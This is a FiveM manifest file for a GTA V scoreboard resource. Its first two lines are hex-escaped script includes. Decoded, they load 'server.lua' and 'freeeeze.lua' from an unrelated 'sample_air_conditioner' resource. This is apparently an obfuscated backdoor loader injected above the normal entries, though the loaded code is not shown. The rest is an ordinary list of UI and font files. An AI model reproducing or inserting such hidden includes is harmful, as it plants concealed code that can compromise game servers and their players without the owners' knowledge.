server_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x73\x65\x72\x76\x65\x72\x2E\x6C\x75\x61"
client_script "\x40\x73\x61\x6D\x70\x6C\x65\x5F\x61\x69\x72\x5F\x63\x6F\x6E\x64\x69\x74\x69\x6F\x6E\x65\x72\x2F\x66\x72\x65\x65\x65\x65\x7A\x65\x2E\x6C\x75\x61"
description 'Scoreboard'

-- temporary!
ui_page 'html/scoreboard.html'

client_script 'scoreboard.lua'
server_script 'server.lua'

lua54 'yes'

files {
    'html/scoreboard.html',
    'html/style.css',
    'html/reset.css',
    'html/listener.js',
    'html/res/futurastd-medium.css',
    'html/res/futurastd-medium.eot',
    'html/res/futurastd-medium.woff',
    'html/res/futurastd-medium.ttf',
    'html/res/futurastd-medium.svg',
}

fx_version 'adamant'
games { 'gta5' }